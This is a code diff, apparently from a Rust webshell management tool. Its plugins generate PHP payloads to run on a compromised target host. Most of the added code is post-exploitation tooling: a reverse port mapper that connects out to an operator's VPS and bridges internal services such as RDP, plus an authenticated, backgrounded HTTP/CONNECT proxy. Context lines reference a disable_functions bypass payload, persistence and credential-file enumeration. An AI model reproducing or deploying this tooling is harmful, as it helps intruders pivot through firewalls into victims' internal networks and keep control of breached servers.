+$deadline = time() + $window;
+while (time() < $deadline) {{
+    $remote = @stream_socket_client('tcp://' . $remoteHost . ':' . $remotePort, $e1, $e2, 4);
+    if ($remote) {{
+        $target = @stream_socket_client('tcp://' . $targetHost . ':' . $targetPort, $e3, $e4, 4);
+        if ($target) {{
+            @stream_set_blocking($remote, false);
+            @stream_set_blocking($target, false);
+            $start = time();
+            while (time() - $start < 240) {{
+                $r = array($remote, $target); $w = null; $x = null;
+                $n = @stream_select($r, $w, $x, 1);
+                if ($n === false) break;
+                foreach ($r as $sock) {{
+                    $data = @fread($sock, 8192);
+                    if ($data === '' && @feof($sock)) break 2;
+                    if ($data !== '' && $data !== false) {{
+                        $dest = ($sock === $remote) ? $target : $remote;
+                        @fwrite($dest, $data);
+                    }}
+                }}
+            }}
+            @fclose($target);
+        }}
+        @fclose($remote);
+    }}
+    usleep(500000);
+}}
+if ($pid === 0) echo json_encode(array('ok' => true, 'mode' => 'foreground', 'remote' => $remoteHost . ':' . $remotePort, 'target' => $targetHost . ':' . $targetPort, 'service' => 'port_map'));
+"#,
+        safe_thost = safe_thost,
+        target_port = target_port,
+        safe_rhost = safe_rhost,
+        remote_port = remote_port,
+        window = window_secs,
+    )
+}
+
+/// 反向端口映射插件 (LCX 模式)：靶机主动出站连接公网 VPS，并与本地/内网目标服务建立反向桥接。
+pub struct PortMapPlugin;
+
+impl FeaturePlugin for PortMapPlugin {
+    fn manifest(&self) -> FeatureManifest {
+        FeatureManifest {
+            id: "port_map".into(),
+            name: "端口映射 (LCX)".into(),
+            version: "2.0.0".into(),
+            description: "在严苛防火墙（仅允许出站）环境下，靶机主动向公网 VPS 发起连接，并将流量反向桥接至本地或内网服务（经典 LCX 模式）。".into(),
+            category: "general".into(),
+            languages: vec![],
+            params: vec![
+                ParamSpec {
+                    name: "remote_host".into(),
+                    label: "远程 VPS 主机 IP".into(),
+                    param_type: "string".into(),
+                    default: Some(serde_json::json!("")),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "remote_port".into(),
+                    label: "远程 VPS 监听端口".into(),
+                    param_type: "int".into(),
+                    default: Some(serde_json::json!(9999)),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "target_host".into(),
+                    label: "目标内网/本地主机 IP".into(),
+                    param_type: "string".into(),
+                    default: Some(serde_json::json!("127.0.0.1")),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "target_port".into(),
+                    label: "目标内网/本地端口".into(),
+                    param_type: "int".into(),
+                    default: Some(serde_json::json!(3389)),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "window".into(),
+                    label: "存活窗口（秒）".into(),
+                    param_type: "int".into(),
+                    default: Some(serde_json::json!(600)),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "action".into(),
+                    label: "操作".into(),
+                    param_type: "select".into(),
+                    default: Some(serde_json::json!("start")),
+                    options: Some(vec!["start".to_string(), "stop".to_string()]),
+                },
+            ],
+            kind: "feature".into(),
+        }
+    }
+
+    fn execute(
+        &self,
+        protocol: &dyn Protocol,
+        session: &dyn SessionState,
+        runtime: &str,
+        params: &serde_json::Value,
+        settings: &AppSettings,
+    ) -> Result<serde_json::Value, ProtocolError> {
+        match runtime {
+            "php" => {
+                let remote_host = param_str(params, "remote_host", "");
+                let remote_port = param_int(params, "remote_port", 9999).clamp(1, 65535);
+                let target_host = param_str(params, "target_host", "127.0.0.1");
+                let target_port = param_int(params, "target_port", 3389).clamp(1, 65535);
+                let window = param_int(params, "window", 600).clamp(30, 3600);
+                let action = param_str(params, "action", "start");
+                let code = php_port_map_code(
+                    &remote_host,
+                    remote_port,
+                    &target_host,
+                    target_port,
+                    window,
+                    &action,
+                );
+                run_payload(protocol, session, &code, settings)
+            }
+            other => Err(ProtocolError::NotSupported(format!(
+                "端口映射暂不支持运行时 {other}"
+            ))),
+        }
+    }
+}
+
+// ---------------------------------------------------------------------------
+// 4. 网络代理综合分发器（兼容综合调用入口）
+// ---------------------------------------------------------------------------
+
+/// 网络代理综合分发器：支持根据 `proxy_type` 参数分别调度 SOCKS 代理、正向端口转发与反向端口映射。
+pub struct NetworkProxyPlugin;
+
+impl FeaturePlugin for NetworkProxyPlugin {
+    fn manifest(&self) -> FeatureManifest {
+        FeatureManifest {
+            id: "network_proxy".into(),
+            name: "网络代理 (综合)".into(),
+            version: "2.0.0".into(),
+            description: "多功能网络代理调度中心（包含 Socks 代理、端口转发、端口映射）。".into(),
+            category: "general".into(),
+            languages: vec![],
+            params: vec![
+                ParamSpec {
+                    name: "proxy_type".into(),
+                    label: "代理方式 (socks: Socks代理 / forward: 端口转发 / map: 端口映射)".into(),
+                    param_type: "select".into(),
+                    default: Some(serde_json::json!("socks")),
+                    options: Some(vec![
+                        "socks".to_string(),
+                        "forward".to_string(),
+                        "map".to_string(),
+                    ]),
+                },
+                ParamSpec {
+                    name: "port".into(),
+                    label: "监听端口 (Socks代理 / 端口转发)".into(),
+                    param_type: "int".into(),
+                    default: Some(serde_json::json!(1080)),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "target_host".into(),
+                    label: "目标内网主机 (端口转发 / 端口映射)".into(),
+                    param_type: "string".into(),
+                    default: Some(serde_json::json!("127.0.0.1")),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "target_port".into(),
+                    label: "目标内网端口 (端口转发 / 端口映射)".into(),
+                    param_type: "int".into(),
+                    default: Some(serde_json::json!(3389)),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "remote_host".into(),
+                    label: "远程 VPS 主机 (端口映射)".into(),
+                    param_type: "string".into(),
+                    default: Some(serde_json::json!("")),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "remote_port".into(),
+                    label: "远程 VPS 端口 (端口映射)".into(),
+                    param_type: "int".into(),
+                    default: Some(serde_json::json!(9999)),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "username".into(),
+                    label: "Socks 认证用户名 (留空免认证)".into(),
+                    param_type: "string".into(),
+                    default: Some(serde_json::json!("")),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "password".into(),
+                    label: "Socks 认证密码 (留空免认证)".into(),
+                    param_type: "string".into(),
+                    default: Some(serde_json::json!("")),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "window".into(),
+                    label: "存活窗口（秒）".into(),
+                    param_type: "int".into(),
+                    default: Some(serde_json::json!(600)),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "action".into(),
+                    label: "操作".into(),
+                    param_type: "select".into(),
+                    default: Some(serde_json::json!("start")),
+                    options: Some(vec!["start".to_string(), "stop".to_string()]),
+                },
+            ],
+            kind: "feature".into(),
+        }
+    }
+
+    fn execute(
+        &self,
+        protocol: &dyn Protocol,
+        session: &dyn SessionState,
+        runtime: &str,
+        params: &serde_json::Value,
+        settings: &AppSettings,
+    ) -> Result<serde_json::Value, ProtocolError> {
+        let proxy_type = param_str(params, "proxy_type", "socks");
+        match proxy_type.as_str() {
+            "forward" => PortForwardPlugin.execute(protocol, session, runtime, params, settings),
+            "map" => PortMapPlugin.execute(protocol, session, runtime, params, settings),
+            _ => SocksProxyPlugin.execute(protocol, session, runtime, params, settings),
+        }
+    }
+}
+
+// ---------------------------------------------------------------------------
 // HTTP 代理（通用，PHP 载荷：绝对 URL 转发 + CONNECT 隧道）
 // ---------------------------------------------------------------------------
 
-fn php_http_proxy_code(port: u32, window_secs: u32, action: &str) -> String {
+fn php_http_proxy_code(
+    port: u32,
+    window_secs: u32,
+    action: &str,
+    username: &str,
+    password: &str,
+) -> String {
     if action == "stop" {
         return format!(
             r#"<?php
@@ -1097,18 +1813,24 @@ return;
             port = port,
         );
     }
+    let safe_user = username.replace('\\', "\\\\").replace('\'', "\\'");
+    let safe_pass = password.replace('\\', "\\\\").replace('\'', "\\'");
     format!(
         r#"<?php
 set_time_limit(0);
 error_reporting(0);
 $port = {port};
 $window = {window};
+$authUser = '{safe_user}';
+$authPass = '{safe_pass}';
+$authRequired = ($authUser !== '' || $authPass !== '');
+$expectedAuth = $authRequired ? 'basic ' . base64_encode($authUser . ':' . $authPass) : '';
 $pidFile = sys_get_temp_dir() . '/.dsw_proxy_' . $port . '.pid';
 $pid = 0;
 if (function_exists('pcntl_fork')) {{
     $pid = pcntl_fork();
     if ($pid > 0) {{
-        echo json_encode(array('ok' => true, 'mode' => 'background', 'pid' => $pid, 'port' => $port));
+        echo json_encode(array('ok' => true, 'mode' => 'background', 'pid' => $pid, 'port' => $port, 'auth' => $authRequired));
         return;
     }}
     if (function_exists('posix_setsid')) @posix_setsid();
@@ -1121,11 +1843,29 @@ while (time() < $deadline) {{
     $conn = @stream_socket_accept($srv, 3);
     if (!$conn) continue;
     $req = @fgets($conn);
-    if ($req === false) {{ fclose($conn); continue; }}
+    if ($req === false) {{ @fclose($conn); continue; }}
+
+    $headers = array();
+    while (($line = @fgets($conn)) !== false) {{
+        if (trim($line) === '') break;
+        if (preg_match('/^([a-zA-Z0-9_\-]+)\s*:\s*(.+)$/i', trim($line), $hm)) {{
+            $headers[strtolower($hm[1])] = trim($hm[2]);
+        }}
+    }}
+
+    if ($authRequired) {{
+        $clientAuth = isset($headers['proxy-authorization']) ? $headers['proxy-authorization'] : '';
+        if (strtolower($clientAuth) !== strtolower($expectedAuth)) {{
+            @fwrite($conn, "HTTP/1.1 407 Proxy Authentication Required\r\nProxy-Authenticate: Basic realm=\"DoSword HTTP Proxy\"\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
+            @fclose($conn);
+            continue;
+        }}
+    }}
+
     if (preg_match('/^CONNECT\s+([^:\s]+):(\d+)\s+HTTP/i', $req, $m)) {{
         $remote = @stream_socket_client('tcp://' . $m[1] . ':' . $m[2], $e1, $e2, 8);
-        if (!$remote) {{ @fwrite($conn, 'HTTP/1.1 502 Bad Gateway\r\n\r\n'); fclose($conn); continue; }}
-        @fwrite($conn, 'HTTP/1.1 200 Connection established\r\n\r\n');
+        if (!$remote) {{ @fwrite($conn, "HTTP/1.1 502 Bad Gateway\r\n\r\n"); @fclose($conn); continue; }}
+        @fwrite($conn, "HTTP/1.1 200 Connection established\r\n\r\n");
         @stream_set_blocking($conn, false);
         @stream_set_blocking($remote, false);
         $start = time();
@@ -1146,22 +1886,19 @@ while (time() < $deadline) {{
         @fclose($remote);
     }} elseif (preg_match('/^(\w+)\s+(\S+)\s+HTTP/i', $req, $m2)) {{
         $url = @parse_url($m2[2]);
-        if (!isset($url['host'])) {{ @fwrite($conn, 'HTTP/1.1 400 Bad Request\r\n\r\n'); fclose($conn); continue; }}
+        if (!isset($url['host'])) {{ @fwrite($conn, "HTTP/1.1 400 Bad Request\r\n\r\n"); @fclose($conn); continue; }}
         $rport = isset($url['port']) ? $url['port'] : (($url['scheme'] === 'https') ? 443 : 80);
         $remote = @stream_socket_client('tcp://' . $url['host'] . ':' . $rport, $e1, $e2, 8);
-        if (!$remote) {{ @fwrite($conn, 'HTTP/1.1 502 Bad Gateway\r\n\r\n'); fclose($conn); continue; }}
+        if (!$remote) {{ @fwrite($conn, "HTTP/1.1 502 Bad Gateway\r\n\r\n"); @fclose($conn); continue; }}
         $path = (isset($url['path']) ? $url['path'] : '/') . (isset($url['query']) ? '?' . $url['query'] : '');
-        $rewrite = $m2[1] . ' ' . $path . ' HTTP/1.1\r\n';
+        $rewrite = $m2[1] . ' ' . $path . " HTTP/1.1\r\n";
         @fwrite($remote, $rewrite);
-        $body = '';
-        while (($line = @fgets($conn)) !== false) {{
-            if (trim($line) === '') break;
-            if (preg_match('/^Host:/i', $line)) continue;
-            @fwrite($remote, $line);
+        foreach ($headers as $hname => $hval) {{
+            if ($hname === 'proxy-authorization' || $hname === 'proxy-connection' || $hname === 'host') continue;
+            @fwrite($remote, ucwords($hname, '-') . ': ' . $hval . "\r\n");
         }}
-        @fwrite($remote, 'Host: ' . $url['host'] . ':' . $rport . "\r\n\r\n");
-        if (preg_match('/content-length:\s*(\d+)/i', $body_headers ?? '')) {{}}
-        $cl = 0;
+        @fwrite($remote, 'Host: ' . $url['host'] . ($rport != 80 && $rport != 443 ? ':' . $rport : '') . "\r\n");
+        @fwrite($remote, "Connection: close\r\n\r\n");
         @stream_set_blocking($conn, false);
         $start = time();
         while (time() - $start < 60) {{
@@ -1175,18 +1912,20 @@ while (time() < $deadline) {{
         @fclose($conn);
         @fclose($remote);
     }} else {{
-        @fwrite($conn, 'HTTP/1.1 400 Bad Request\r\n\r\n');
-        fclose($conn);
+        @fwrite($conn, "HTTP/1.1 400 Bad Request\r\n\r\n");
+        @fclose($conn);
     }}
 }}
-if ($pid === 0) echo json_encode(array('ok' => true, 'mode' => 'foreground', 'port' => $port, 'window' => $window));
+if ($pid === 0) echo json_encode(array('ok' => true, 'mode' => 'foreground', 'port' => $port, 'window' => $window, 'auth' => $authRequired));
 "#,
         port = port,
         window = window_secs,
+        safe_user = safe_user,
+        safe_pass = safe_pass,
     )
 }
 
-/// HTTP 代理（通用：PHP 载荷，绝对 URL 转发 + CONNECT 隧道）。
+/// HTTP 代理（通用：PHP 载荷，支持 Basic 认证，绝对 URL 转发 + CONNECT 隧道）。
 pub struct HttpProxyPlugin;
 
 impl FeaturePlugin for HttpProxyPlugin {
@@ -1194,8 +1933,9 @@ impl FeaturePlugin for HttpProxyPlugin {
         FeatureManifest {
             id: "http_proxy".into(),
             name: "HTTP 代理".into(),
-            version: "1.0.0".into(),
-            description: "在目标主机启动 HTTP 代理（绝对 URL 转发 + CONNECT 隧道）。".into(),
+            version: "2.0.0".into(),
+            description:
+                "在目标主机启动 HTTP 代理（支持 Basic 认证；绝对 URL 转发 + CONNECT 隧道）。".into(),
             category: "general".into(),
             languages: vec![],
             params: vec![
@@ -1204,6 +1944,20 @@ impl FeaturePlugin for HttpProxyPlugin {
                     label: "监听端口".into(),
                     param_type: "int".into(),
                     default: Some(serde_json::json!(8080)),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "username".into(),
+                    label: "认证用户名 (留空免认证)".into(),
+                    param_type: "string".into(),
+                    default: Some(serde_json::json!("")),
+                    options: None,
+                },
+                ParamSpec {
+                    name: "password".into(),
+                    label: "认证密码 (留空免认证)".into(),
+                    param_type: "string".into(),
+                    default: Some(serde_json::json!("")),
                     options: None,
                 },
                 ParamSpec {
@@ -1238,7 +1992,9 @@ impl FeaturePlugin for HttpProxyPlugin {
                 let port = param_int(params, "port", 8080).clamp(1024, 65535);
                 let window = param_int(params, "window", 600).clamp(30, 3600);
                 let action = param_str(params, "action", "start");
-                let code = php_http_proxy_code(port, window, &action);
+                let username = param_str(params, "username", "");
+                let password = param_str(params, "password", "");
+                let code = php_http_proxy_code(port, window, &action, &username, &password);
                 run_payload(protocol, session, &code, settings)
             }
             other => Err(ProtocolError::NotSupported(format!(
@@ -1390,10 +2146,10 @@ if ($m === 'symlink') {{
 
 echo json_encode($out);
 "#,
-        target = php_json_str(&target),
-        method = php_json_str(&method),
+        target = php_json_str(target),
+        method = php_json_str(method),
         recursive = if recursive { "true" } else { "false" },
-        write_data = php_json_str(&write_data),
+        write_data = php_json_str(write_data),
     )
 }
 
@@ -1610,7 +2366,7 @@ if (isset($out['result']) && $out['result'] === '') {{
 }}
 echo json_encode($out);
 "#,
-        command = php_json_str(&command),
+        command = php_json_str(command),
     )
     .replace("__C_PAYLOAD__", BYPASS_C_PAYLOAD)
 }
@@ -1693,8 +2449,8 @@ foreach ($it as $f) {{
 }}
 echo json_encode($out);
 "#,
-        dir = php_json_str(&dir),
-        keyword = php_json_str(&keyword),
+        dir = php_json_str(dir),
+        keyword = php_json_str(keyword),
         content = if in_content { "true" } else { "false" },
         depth = max_depth,
     )
@@ -1887,10 +2643,10 @@ if ($op === 'encrypt') {{
 }}
 echo json_encode(array('ok' => true, 'op' => $op, 'algo' => $algo, 'result' => $out));
 "#,
-        op = php_json_str(&op),
-        algorithm = php_json_str(&algorithm),
-        text = php_json_str(&text),
-        pass = php_json_str(&pass),
+        op = php_json_str(op),
+        algorithm = php_json_str(algorithm),
+        text = php_json_str(text),
+        pass = php_json_str(pass),
     )
 }
 
@@ -1989,7 +2745,7 @@ echo json_encode(array('ok' => true, 'persisted' => $persist !== '' && isset($w)
 "#,
         code_raw = code,
         code_esc = code.replace("\\", "\\\\").replace("'", "\\'"),
-        path = php_json_str(&persist_path),
+        path = php_json_str(persist_path),
     )
 }
 
@@ -2339,7 +3095,8 @@ impl FeaturePlugin for CredScanPlugin {
             id: "cred_scan".into(),
             name: "凭据枚举".into(),
             version: "1.0.0".into(),
-            description: "枚举常见凭据/敏感文件（ssh key、密码库、配置）存在性——仅检查不读取内容。".into(),
+            description: "枚举常见凭据/敏感文件（ssh key、密码库、配置）存在性——仅检查不读取内容。"
+                .into(),
             category: "general".into(),
             languages: vec![],
             params: vec![],
@@ -2358,4 +3115,3 @@ impl FeaturePlugin for CredScanPlugin {
         run_command(protocol, session, cred_command(runtime), settings)
     }
 }
-
